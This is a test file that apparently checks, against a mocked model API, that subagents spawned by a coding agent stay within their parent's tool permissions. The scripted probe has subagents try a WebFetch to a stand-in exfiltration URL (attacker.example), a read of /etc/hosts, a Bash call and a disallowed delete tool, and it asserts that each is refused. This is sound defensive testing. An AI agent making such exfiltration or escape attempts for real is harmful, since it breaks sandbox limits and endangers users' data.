// @vitest-environment node
/**
 * Pins that a subagent spawned through the Agent/Task tool is no wider than its parent.
 *
 * This runs the REAL entry script (scripts/agent/turn-entry.ts) with the REAL Claude Code CLI behind the
 * Agent SDK, against local stand-ins for the two services it talks to:
 *   - a scripted Anthropic Messages API (the "model": it spawns each built-in subagent type, then makes the
 *     subagent try things it must not be able to do), and
 *   - a minimal Compass MCP endpoint that advertises one tool the entry script disallows.
 * Nothing leaves the machine and no key is spent. What is asserted is what the CLI actually did:
 *   1. the tool list a subagent's model request carried is a subset of its parent's (`tools` / `disallowedTools`),
 *   2. the PreToolUse hooks (docs jail, WebFetch allowlist) ran on the subagent's calls exactly as on the parent's,
 *   3. a tool outside `tools` (Bash) or in `disallowedTools` (delete_assumption, TodoWrite) is unusable from a subagent,
 *   4. a positive control (reading inside the doc tree) works for parent and subagent alike, so the refusals are policy
 *      and not a broken tool.
 */
import { spawn } from "node:child_process"
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs"
import http from "node:http"
import type { AddressInfo } from "node:net"
import { tmpdir } from "node:os"
import path from "node:path"
import { afterAll, beforeAll, describe, expect, it } from "vitest"

type Block = { type: string; [key: string]: unknown }
type ApiMessage = { role: string; content: string | Block[] }
type ApiRequest = { tools?: { name: string }[]; messages: ApiMessage[] }
type ToolResult = { id: string; text: string; isError: boolean }
type Reply = { tool: { name: string; input: Record<string, unknown> } } | { text: string }

const SUBAGENT_MARKER = "SUBAGENT_PROBE_MARKER"
/** Every built-in agent type the Agent tool advertises; each must be bounded by the parent. */
const SUBAGENT_TYPES = ["general-purpose", "Explore", "Plan"]
/**
 * Types that run in the parent's permission mode (bypassPermissions), so the entry script's own PreToolUse hooks are what
 * refuse the call. Plan runs in the CLI's default mode, where an unapproved tool is refused by the permission layer instead
 * (no approver exists in a sandbox) -- also a refusal, just with different wording.
 */
const HOOK_DECIDES = ["general-purpose", "Explore"]
const DOC_TEXT = "HELLO_FROM_THE_DOC_TREE"
const EXFIL_URL = "https://attacker.example/?d=secret"
const OUTSIDE_FILE = "/etc/hosts"
const FORBIDDEN_TOOLS = ["Bash", "TodoWrite", "mcp__compass__delete_assumption", "TaskCreate", "TaskUpdate", "TaskList", "TaskGet", "NotebookEdit", "WebSearch"]

const sse = (event: string, data: unknown) => `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`

function replyStream(reply: Reply, n: number): string {
  let out = sse("message_start", { type: "message_start", message: { id: `msg_probe_${n}`, type: "message", role: "assistant", model: "probe-model", content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 1, output_tokens: 1 } } })
  if ("tool" in reply) {
    out += sse("content_block_start", { type: "content_block_start", index: 0, content_block: { type: "tool_use", id: `toolu_probe_${n}`, name: reply.tool.name, input: {} } })
    out += sse("content_block_delta", { type: "content_block_delta", index: 0, delta: { type: "input_json_delta", partial_json: JSON.stringify(reply.tool.input) } })
  } else {
    out += sse("content_block_start", { type: "content_block_start", index: 0, content_block: { type: "text", text: "" } })
    out += sse("content_block_delta", { type: "content_block_delta", index: 0, delta: { type: "text_delta", text: reply.text } })
  }
  out += sse("content_block_stop", { type: "content_block_stop", index: 0 })
  out += sse("message_delta", { type: "message_delta", delta: { stop_reason: "tool" in reply ? "tool_use" : "end_turn", stop_sequence: null }, usage: { output_tokens: 1 } })
  out += sse("message_stop", { type: "message_stop" })
  return out
}

const firstUserText = (request: ApiRequest): string => {
  const first = request.messages.find((m) => m.role === "user")
  if (!first) return ""
  return typeof first.content === "string" ? first.content : first.content.map((b) => (typeof b.text === "string" ? b.text : "")).join("\n")
}

const toolResults = (request: ApiRequest): ToolResult[] =>
  request.messages.flatMap((m) =>
    typeof m.content === "string"
      ? []
      : m.content
          .filter((b) => b.type === "tool_result")
          .map((b) => ({
            id: String(b.tool_use_id),
            isError: b.is_error === true,
            text: typeof b.content === "string" ? b.content : Array.isArray(b.content) ? (b.content as Block[]).map((c) => String(c.text ?? "")).join("\n") : "",
          })),
  )

/** What each subagent is asked to attempt, in order. */
const subagentAttempts = (docFile: string): { name: string; input: Record<string, unknown> }[] => [
  { name: "Read", input: { file_path: docFile } },
  { name: "WebFetch", input: { url: EXFIL_URL, prompt: "summarize" } },
  { name: "Read", input: { file_path: OUTSIDE_FILE } },
  { name: "Bash", input: { command: "id" } },
  { name: "mcp__compass__delete_assumption", input: {} },
  { name: "TodoWrite", input: { todos: [{ content: "x", activeForm: "x", status: "pending" }] } },
]

let mock: http.Server
let parentTools: string[] = []
let parentResults: ToolResult[] = []
const subagents = new Map<string, { tools: string[]; results: ToolResult[] }>()
let stdout = ""
let stderr = ""
let exitCode: number | null = null
let docsRoot = ""
const scratch = mkdtempSync(path.join(tmpdir(), "subagent-inherit-"))

function nextReply(request: ApiRequest): Reply {
  const names = (request.tools ?? []).map((t) => t.name)
  const docFile = path.join(docsRoot, "probe", "_doc.md")
  const marked = new RegExp(`${SUBAGENT_MARKER}:(\\S+)`).exec(firstUserText(request))
  if (marked) {
    const results = toolResults(request)
    subagents.set(marked[1], { tools: names, results })
    const next = subagentAttempts(docFile)[results.length]
    return next ? { tool: next } : { text: "subagent done" }
  }
  if (parentTools.length === 0) parentTools = names
  const results = toolResults(request)
  parentResults = results
  // Parent control group: the same read inside the doc tree, and the same refused read outside it, made directly.
  const controls = [
    { name: "Read", input: { file_path: docFile } },
    { name: "Read", input: { file_path: OUTSIDE_FILE } },
  ]
  if (results.length < controls.length) return { tool: controls[results.length] }
  const spawned = results.length - controls.length
  if (spawned < SUBAGENT_TYPES.length) {
    const type = SUBAGENT_TYPES[spawned]
    return { tool: { name: "Agent", input: { description: `probe ${type}`, prompt: `${SUBAGENT_MARKER}:${type} try the following tools.`, subagent_type: type } } }
  }
  return { text: "parent done" }
}

function mcpResponse(body: { id?: number | string; method?: string }, searchServer: boolean): unknown {
  switch (body.method) {
    case "initialize":
      return { jsonrpc: "2.0", id: body.id, result: { protocolVersion: "2025-03-26", capabilities: { tools: {} }, serverInfo: { name: "stub", version: "0" } } }
    case "tools/list":
      return {
        jsonrpc: "2.0",
        id: body.id,
        result: {
          tools: searchServer
            ? []
            : [
                { name: "list_tasks", description: "stub", inputSchema: { type: "object", properties: {} } },
                // In the entry script's disallowedTools: it must not reach the model, parent or subagent.
                { name: "delete_assumption", description: "stub (disallowed)", inputSchema: { type: "object", properties: {} } },
              ],
        },
      }
    case "tools/call":
      return { jsonrpc: "2.0", id: body.id, result: { content: [{ type: "text", text: "stub" }] } }
    default:
      return { jsonrpc: "2.0", id: body.id, result: {} }
  }
}

beforeAll(async () => {
  let calls = 0
  mock = http.createServer((req, res) => {
    const chunks: Buffer[] = []
    req.on("data", (c) => chunks.push(c))
    req.on("end", () => {
      const raw = Buffer.concat(chunks).toString("utf8")
      const url = req.url ?? ""
      if (url.startsWith("/v1/messages/count_tokens")) {
        res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ input_tokens: 1 }))
      } else if (url.startsWith("/v1/messages")) {
        const request = JSON.parse(raw) as ApiRequest
        // Housekeeping calls the CLI makes on its own (titles, suggestions) carry no tools; answer them plainly.
        const reply: Reply = request.tools && request.tools.length > 0 ? nextReply(request) : { text: "ok" }
        res.writeHead(200, { "content-type": "text/event-stream" }).end(replyStream(reply, ++calls))
      } else if (url.startsWith("/api/mcp") || url.startsWith("/api/agent/web-search/mcp")) {
        const body = raw ? (JSON.parse(raw) as { id?: number | string; method?: string }) : {}
        if (req.method !== "POST") res.writeHead(405).end()
        else if (body.id === undefined) res.writeHead(202).end()
        else res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify(mcpResponse(body, url.startsWith("/api/agent/web-search"))))
      } else {
        res.writeHead(404).end()
      }
    })
  })
  await new Promise<void>((resolve) => mock.listen(0, "127.0.0.1", resolve))
  const baseUrl = `http://127.0.0.1:${(mock.address() as AddressInfo).port}`

  docsRoot = path.join(scratch, "docs")
  mkdirSync(path.join(docsRoot, "probe"), { recursive: true })
  writeFileSync(path.join(docsRoot, "probe", "_doc.md"), DOC_TEXT)

  const child = spawn(process.execPath, ["--experimental-strip-types", path.join(process.cwd(), "scripts/agent/turn-entry.ts")], {
    cwd: process.cwd(),
    env: {
      NODE_ENV: "test",
      PATH: process.env.PATH,
      HOME: scratch,
      MCP_BASE_URL: baseUrl,
      MCP_TOKEN: "cmp_probe_token",
      AGENT_PROMPT: "Probe the subagent boundary.",
      AGENT_SYSTEM_PROMPT: "You are a probe.",
      AGENT_MODEL: "claude-sonnet-4-5",
      ANTHROPIC_API_KEY: "sk-ant-probe",
      ANTHROPIC_BASE_URL: baseUrl,
      DOCS_ROOT: docsRoot,
      CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1",
      DISABLE_AUTOUPDATER: "1",
    },
    stdio: ["ignore", "pipe", "pipe"],
  })
  child.stdout.on("data", (d) => (stdout += d))
  child.stderr.on("data", (d) => (stderr += d))
  exitCode = await new Promise<number | null>((resolve) => {
    const timer = setTimeout(() => {
      child.kill("SIGKILL")
      resolve(null)
    }, 150_000)
    child.on("close", (code) => {
      clearTimeout(timer)
      resolve(code)
    })
  })
}, 180_000)

afterAll(async () => {
  await new Promise<void>((resolve) => mock.close(() => resolve()))
  rmSync(scratch, { recursive: true, force: true })
})

describe("subagents spawned via Agent/Task are no wider than the parent turn", () => {
  it("ran the whole scripted scenario through the real entry script", () => {
    if (process.env.PROBE_DEBUG) writeFileSync(process.env.PROBE_DEBUG, JSON.stringify({ exitCode, parentTools, parentResults, subagents: [...subagents], stderr: stderr.slice(-1500) }, null, 1))
    expect(stdout, stderr).toContain("AGENT_RESULT")
    expect(exitCode).toBe(0)
    expect(parentTools).toContain("Agent")
    expect([...subagents.keys()].sort()).toEqual([...SUBAGENT_TYPES].sort())
  })

  it("control: the parent can read the doc tree and is refused outside it", () => {
    const [inside, outside] = parentResults
    expect(inside?.isError, JSON.stringify(inside)).toBe(false)
    expect(inside?.text).toContain(DOC_TEXT)
    expect(outside?.isError, JSON.stringify(outside)).toBe(true)
  })

  it.each(SUBAGENT_TYPES)("%s: gets a tool list that is a subset of the parent's, with every disallowed tool absent", (type) => {
    const seen = subagents.get(type)
    expect(seen).toBeDefined()
    expect((seen?.tools ?? []).filter((name) => !parentTools.includes(name))).toEqual([])
    for (const forbidden of FORBIDDEN_TOOLS) {
      expect(parentTools).not.toContain(forbidden)
      expect(seen?.tools).not.toContain(forbidden)
    }
    expect(seen?.tools).toContain("mcp__compass__list_tasks")
  })

  it.each(SUBAGENT_TYPES)("%s: PreToolUse hooks and tool gates refuse what the parent is refused, and allow what the parent may do", (type) => {
    const results = subagents.get(type)?.results ?? []
    const [docRead, webFetch, outside, bash, deleteAssumption, todoWrite] = results
    expect(results.length).toBe(subagentAttempts("").length)
    // Positive control: the same tool works inside the jail, so the refusals below are the policy and not a broken tool.
    expect(docRead?.isError, JSON.stringify(docRead)).toBe(false)
    expect(docRead?.text).toContain(DOC_TEXT)
    // Hooks: the WebFetch allowlist and the docs path guard run on the subagent's calls, with the parent's verdict.
    expect(webFetch?.isError, JSON.stringify(webFetch)).toBe(true)
    expect(outside?.isError, JSON.stringify(outside)).toBe(true)
    // Which layer words the refusal varies from run to run for the out-of-tree read (the CLI's own outside-cwd check races the
    // hook), so only the refusal is pinned there. WebFetch has no permission layer in bypass mode: only the hook can have refused it.
    if (HOOK_DECIDES.includes(type)) expect(webFetch?.text).toContain("Blocked: WebFetch only opens URLs")
    // Tools outside `tools` or in `disallowedTools`.
    for (const refused of [bash, deleteAssumption, todoWrite]) {
      expect(refused?.isError, JSON.stringify(refused)).toBe(true)
      expect(refused?.text).toContain("No such tool available")
    }
  })
})
